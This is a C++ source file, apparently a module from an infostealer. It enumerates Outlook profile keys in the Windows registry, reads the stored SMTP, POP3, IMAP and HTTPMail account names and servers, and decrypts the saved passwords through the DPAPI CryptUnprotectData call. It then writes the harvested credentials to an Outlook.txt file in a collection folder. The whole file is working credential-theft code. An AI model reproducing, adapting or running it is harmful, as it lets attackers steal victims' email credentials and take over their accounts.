#include "Outlook.h"
#include <Windows.h>
#include <vector>
#include <fstream>
#include <iostream>

// Suppress warnings about deprecated features in the experimental filesystem library
#define  _SILENCE_EXPERIMENTAL_FILESYSTEM_DEPRECATION_WARNING

// Include the experimental filesystem library for file operations
#include <experimental/filesystem>
// Create a shorthand namespace alias for easier reference
namespace fs = std::experimental::filesystem;

// Link the Crypt32 library, which provides cryptographic functions
#pragma comment(lib, "Crypt32.lib")

// Define regular expressions for validating email addresses and server names
const std::regex Outlook::MailClient = std::regex("^([a-zA-Z0-9_\\-\\.]+)@([a-zA-Z0-9_\\-\\.]+)\\.([a-zA-Z]{2,5})$"); // Regex for valid email addresses
const std::regex Outlook::SmptClient = std::regex("^(?!:\\/\\/)([a-zA-Z0-9-_]+\\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\\.[a-zA-Z]{2,11}?$"); // Regex for SMTP server addresses

// List of registry paths to Outlook profile data
std::vector<std::string> Outlook::regDirectories = {
    "Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
    "Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
    "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
    "Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676"
};

// List of keys commonly associated with Outlook mail clients in the registry
std::vector<std::string> Outlook::mailClients = {
    "SMTP Email Address", "SMTP Server", "POP3 Server",
    "POP3 User Name", "SMTP User Name", "NNTP Email Address",
    "NNTP User Name", "NNTP Server", "IMAP Server", "IMAP User Name",
    "Email", "HTTP User", "HTTP Server URL", "POP3 User",
    "IMAP User", "HTTPMail User Name", "HTTPMail Server",
    "SMTP User", "POP3 Password2", "IMAP Password2",
    "NNTP Password2", "HTTPMail Password2", "SMTP Password2",
    "POP3 Password", "IMAP Password", "NNTP Password",
    "HTTPMail Password", "SMTP Password"
};

// Main function to retrieve Outlook profile data and save it to a file
void Outlook::GrabOutlook(const std::string& sSavePath) {

    // Variable to store retrieved data
    std::string data = "";

    // Iterate over the predefined registry paths
    for (const auto& dir : Outlook::regDirectories) {

        // Retrieve data for the given registry path and mail clients
        data += Get(dir, Outlook::mailClients);
    }

    // If no data was retrieved, exit the function
    //if (data.empty()) return;
    if (data.empty()) {

        return;
    }

    // Attempt to create directories at the specified save path
    bool result = fs::create_directories(sSavePath);
    if (!result) {
        return; // Exit if directory creation failed
    }

    // Open a file to save the retrieved data
    std::ofstream file(sSavePath + "\\Outlook.txt");
    if (file.is_open()) {
        file << data;  // Write data to the file
        file.close();  // Close the file
    }
}

// Assuming DecryptValue and regex patterns (SmptClient, MailClient) are declared elsewhere.
std::string Outlook::Get(const std::string& path, const std::vector<std::string>& clients) {
    std::string data; // Stores the collected data

    try {
        HKEY key;
        // Attempt to open the registry key
        if (RegOpenKeyExA(HKEY_CURRENT_USER, path.c_str(), 0, KEY_READ, &key) != ERROR_SUCCESS) {
            return ""; // Early exit if the registry key cannot be opened
        }

        DWORD subKeysCount = 0;
        // Query the number of subkeys in the registry key
        if (RegQueryInfoKeyA(key, nullptr, nullptr, nullptr, &subKeysCount, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr) != ERROR_SUCCESS) {
            RegCloseKey(key); // Clean up and exit on failure
            return "";
        }

        // Iterate through each subkey
        for (DWORD i = 0; i < subKeysCount; ++i) {
            char subKeyName[256]; // Buffer to hold subkey name
            DWORD subKeyNameSize = sizeof(subKeyName);

            // Enumerate subkeys and retrieve their names
            if (RegEnumKeyExA(key, i, subKeyName, &subKeyNameSize, nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS) {
                HKEY subKey;
                // Open the enumerated subkey
                if (RegOpenKeyExA(key, subKeyName, 0, KEY_READ, &subKey) == ERROR_SUCCESS) {
                    // Process each client within the subkey
                    for (const auto& client : clients) {
                        DWORD size = 0;
                        // Query the size of the value associated with the client
                        if (RegQueryValueExA(subKey, client.c_str(), nullptr, nullptr, nullptr, &size) == ERROR_SUCCESS) {
                            std::vector<unsigned char> value(size); // Buffer for the value
                            // Retrieve the actual value data
                            if (RegQueryValueExA(subKey, client.c_str(), nullptr, nullptr, value.data(), &size) == ERROR_SUCCESS) {
                                // Handle sensitive data like passwords
                                if (strstr(client.c_str(), "Password") && !strstr(client.c_str(), "2")) {
                                    data += client + ": " + DecryptValue(value.data(), static_cast<int>(size)) + "\r\n";
                                }
                                else {
                                    // Convert the value to a proper format and append to data
                                    try {
                                        std::wstring wstr(reinterpret_cast<wchar_t*>(value.data()), size / sizeof(wchar_t));
                                        std::string converted(wstr.begin(), wstr.end());
                                        if (std::regex_match(converted, SmptClient) || std::regex_match(converted, MailClient)) {
                                            data += client + ": " + converted + "\r\n";
                                        }
                                        else {
                                            data += client + ": " + std::string(reinterpret_cast<char*>(value.data()), size) + "\r\n";
                                        }
                                    }
                                    catch (...) {
                                        // Safeguard against unexpected conversion issues
                                    }
                                }
                            }
                        }
                    }
                    RegCloseKey(subKey); // Close the opened subkey
                }
            }
        }

        RegCloseKey(key); // Close the main registry key
    }
    catch (const std::exception& e) {
        // Log any exception encountered during execution
        std::cerr << "Error: " << e.what() << std::endl;
    }
    catch (...) {
        // Catch-all for unknown exceptions
        std::cerr << "An unknown error occurred." << std::endl;
    }

    return data; // Return the collected data
}

// Function to decrypt registry values, specifically for passwords
std::string Outlook::DecryptValue(unsigned char* value, int size) {
    std::string result;

    try {
        // Create a decoded buffer by skipping the first byte
        BYTE* decoded = new BYTE[size - 1];
        memcpy(decoded, value + 1, size - 1);

        DATA_BLOB input;
        input.cbData = size - 1;
        input.pbData = decoded;

        DATA_BLOB output;
        if (CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr, 0, &output)) {
            // Convert the decrypted data to a string
            result = std::string(reinterpret_cast<char*>(output.pbData), output.cbData);
            LocalFree(output.pbData); // Free allocated memory
        }
        else {
            return "null"; // Return "null" if decryption fails
        }
    }
    catch (...) {
        // Ignore exceptions during decryption
    }

    // Remove unnecessary whitespace and null characters from the result
    result.erase(std::remove_if(result.begin(), result.end(), [](char c) { return std::isspace(c) || c == '\0'; }), result.end());

    return result; // Return the decrypted string
}
